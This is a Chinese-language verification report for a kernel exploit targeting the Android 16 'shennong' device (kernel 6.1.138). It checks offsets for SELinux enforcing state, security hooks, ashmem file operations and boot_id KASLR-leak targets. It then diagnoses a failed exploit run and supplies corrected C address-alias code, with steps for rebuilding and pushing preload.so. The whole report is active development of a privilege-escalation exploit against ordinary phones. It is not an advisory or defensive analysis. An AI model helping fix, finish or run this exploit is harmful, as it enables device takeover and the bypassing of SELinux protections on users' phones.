# shennong (OS3.0.307.0.WNBCNXM / Android 16 / kernel 6.1.138) target.h 地址验证报告

验证基准：`kernel.bin`（boot.img 内核载荷，raw arm64 Image，0x21caa00 字节）+ `syms.json`（kallsyms，relative_base=0xffffffc008000000）
验证方式：kallsyms 符号表逐项比对 + kernel.bin 原始字节/反汇编交叉验证（llvm-objdump）。

## 一、结论摘要

| 项目 | 结论 |
|---|---|
| target.h 全部 24 个符号偏移 | ✅ 全部正确（含 5 个 kallsyms 符号名不同的条目） |
| VA 布局常量（KIMAGE_TEXT_BASE / PAGE_OFFSET / PHYS_OFFSET / PHYS_LOAD / DELTA） | ✅ 正确，39-bit VA |
| 本次运行失败的根因 | ❌ **不是 target.h**，是 `src/common.h:120-121` 与 `src/util.c:254-258` 的 linear-alias 公式写错（用 `P0_KERNEL_PHYS_DELTA` 代替 `P0_KERNEL_PHYS_LOAD`，别名整体低 2GB） |
| run2 日志 | 地址全对，但 slide 泄漏原语本身也未成功（boot_id 未被重定向）——修完别名后需继续排查 |

## 二、符号偏移逐项验证（target.h vs kallsyms）

所有值均为相对 `_text`(0xffffffc008000000) 的 RVA：

| target.h 宏 | 期望 RVA | kallsyms 符号 / 实际 RVA | 结果 |
|---|---|---|---|
| INIT_TASK_OFF | 0x01fef600 | init_task | ✅ |
| INIT_UTS_NS_OFF | 0x02171eb0 | init_uts_ns | ✅ |
| EMPTY_ZERO_PAGE_OFF | 0x021d0000 | empty_zero_page | ✅ |
| ROOT_TASK_GROUP_OFF | 0x021d7580 | root_task_group | ✅ |
| SELINUX_BLOB_SIZES_OFF | 0x015b7788 | selinux_blob_sizes（sel_write_enforce 中 `ldrsw x9,[x9,#0x788]` 交叉印证） | ✅ |
| SELINUX_ENFORCING_OFF | 0x022293d0 | selinux_state（enforcing=偏移 0 字节，sel_write_enforce `strb [x21]` 证实） | ✅ |
| SECURITY_HOOK_HEADS_OFF | 0x015b7078 | security_hook_heads | ✅ |
| KMALLOC_CACHES_OFF | 0x015b6bb8 | kmalloc_caches | ✅ |
| ANON_PIPE_BUF_OPS_OFF | 0x010f7150 | anon_pipe_buf_ops | ✅ |
| NOOP_LLSEEK_OFF | 0x00396780 | noop_llseek | ✅ |
| COPY_SPLICE_READ_OFF | 0x003e3fa8 | **generic_file_splice_read**（本内核沿用旧名） | ✅ |
| CONFIGFS_READ_ITER_OFF | 0x00461b9c | configfs_read_iter | ✅ |
| CONFIGFS_BIN_WRITE_ITER_OFF | 0x004620cc | configfs_bin_write_iter | ✅ |
| ASHMEM_FOPS_OFF | 0x0126d7b8 | ashmem_fops | ✅ |
| ASHMEM_IOCTL_OFF | 0x00c2db80 | ashmem_ioctl | ✅ |
| ASHMEM_COMPAT_IOCTL_OFF | 0x00c2e4b8 | **compat_ashmem_ioctl**（命名顺序不同） | ✅ |
| ASHMEM_MMAP_OFF | 0x00c2e510 | ashmem_mmap | ✅ |
| ASHMEM_OPEN_OFF | 0x00c2e730 | ashmem_open | ✅ |
| ASHMEM_RELEASE_OFF | 0x00c2e7b8 | ashmem_release | ✅ |
| ASHMEM_SHOW_FDINFO_OFF | 0x00c2e8d8 | ashmem_show_fdinfo | ✅ |
| ASHMEM_MISC_FOPS_OFF | 0x0214bec0 | = `&ashmem_miscs[0].fops`（+0x10 字段；实测字节 = &ashmem_fops = 0xffffffc00926d7b8） | ✅ |
| SLIDE_LOGGERS_0_1_OFF | 0x01fe2918 | = `&loggers[1]`（loggers @ 0x01fe2910） | ✅ |
| SLIDE_NFULNL_LOGGER_OFF | 0x01fe29c8 | nfulnl_logger | ✅ |
| SLIDE_RANDOM_BOOT_ID_DATA_OFF | 0x02107448 | = random_table 中 boot_id 条目的 **.data 字段**（初值 = &boot_id = 0xffffffc00a24a458）；注意它是"字段地址"而非 boot_id 缓冲本身 | ✅ |
| SLIDE_SYSCTL_BOOTID_OFF | 0x0224a458 | = boot_id 数据缓冲（kallsyms 名恰为 sysctl_bootid，位于 .bss） | ✅ |

## 三、VA 布局常量验证

- `KIMAGE_TEXT_BASE 0xffffffc008000000`：kallsyms relative_base / `_text` 精确命中，39-bit VA ✅
- `P0_PAGE_OFFSET 0xffffff8000000000`：linear alias = PAGE_OFFSET + phys，由 run2 实测 `init_task 别名 0xffffff80a9fef600 = 0xffffff8000000000 + 0xa9fef600` 印证 ✅
- `P0_PHYS_OFFSET 0x80000000` / `P0_KERNEL_PHYS_LOAD 0xa8000000` / `DELTA 0x28000000`：与 Image 头 `text_offset=0`、boot 期 DRAM 布局一致 ✅

## 四、本次失败根因：别名公式 2GB 偏移（必须修复）

**症状**：本次日志 p0 profile 打印 `init_task=ffffff8029fef600` 等；run2 正确值应为 `ffffff80a9fef600`（差 0x80000000=2GB）。
物理地址 0x29fef600 落在 DRAM 起点 0x80000000 之下 → 别名页不可访问 → KernelSnitch mm_struct leak 失败 → prepare_kernel_page 无内核页 → slide 阶段读到未初始化页，泄漏指针 `e44d045cb10002c1` 为垃圾。

**当前错误代码**：
```c
/* common.h:119-121 */
#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
#define P0_DATA_ALIAS_CONST(image_addr) \
  (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))  // ← 错

/* util.c:254-258 */
uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);   // ← 错，同因
}
```
`DELTA 版 = PAGE_OFFSET + 0x28000000 + off`，正确应为 `PAGE_OFFSET + 0xa8000000 + off`。DELTA 版仅当 `P0_PHYS_OFFSET==0` 的机型（如部分 Pixel target）才碰巧正确；shennong PHYS_OFFSET=0x80000000 必错。target.h 里的 `P0_DATA_ALIAS_CONST`（加 P0_KERNEL_PHYS_LOAD）是正确的，但被 root common.h 覆盖/代码未走它。

**修复**：
```c
/* common.h */
#define P0_DATA_ALIAS_CONST(image_addr) \
  (P0_PAGE_OFFSET + P0_KERNEL_PHYS_LOAD + ((image_addr) - KIMAGE_TEXT_BASE))

/* util.c */
uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  return P0_PAGE_OFFSET + P0_KERNEL_PHYS_LOAD + off;
}
uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_LOAD;
}
```
重新编译并推送 preload.so 后，p0 profile 应打印 `ffffff80a9fe29c8 / ffffff80aa107448 / ffffff80a9fef600 / ffffff80aa1d7580 / ffffff80aa24a458`（与 run2 一致）。

## 五、其他发现

1. **run2 地址全对但 slide 原语也未成功**：`slide leaked value is not a kernel pointer (likely untouched boot_id): 024bfbe4d20546a0` —— 读到的仍是未篡改的 boot_id，说明 rb 写没有落到 random_table.data 字段。这是与地址无关的 futex/EDEADLK 原语或布局/时序问题，修完别名后需要继续排查（建议先跑 PROBE MODE 看 fd_set 写回是否命中）。
2. **kernel.bin 大小正常**：0x21caa00 < Image 头 image_size 0x2270000 不是截断——尾部 0xa5600 为 .bss（bootloader 零填充；boot_id 缓冲在 .bss 懒生成，所以 run2 能读到真实 UUID）。文件完整。
3. ashmem_miscs[0]：minor=0xff(动态)、name="ashmem"、fops@+0x10=&ashmem_fops ✅。
4. loggers[0]/[1] 编译期初值 = 0，运行时由 nfnetlink_log 填充；SLIDE_NFULNL_LOGGER 指向 nfulnl_logger 实例地址正确。

## 六、建议下一步

1. 按第四节修复 common.h + util.c，重新构建 preload.so，`adb push` + 重跑。
2. 确认 p0 profile 数值与 run2 一致后，若 slide 仍报 "not a kernel pointer"，转向排查 slide.c 的 pselect 泄漏原语（对照 run2 PROBE MODE 的 word map 输出）。
